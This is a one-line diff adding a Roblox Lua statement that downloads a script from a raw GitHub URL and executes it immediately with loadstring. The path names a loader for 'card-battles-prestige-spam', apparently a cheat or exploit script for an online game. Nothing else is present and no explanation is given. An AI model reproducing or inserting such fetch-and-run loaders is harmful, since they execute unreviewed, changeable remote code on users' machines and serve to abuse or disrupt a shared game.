@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/upd-2-card-battles-prestige-spam7-vydjz4tvo6dhu5.lua"))()
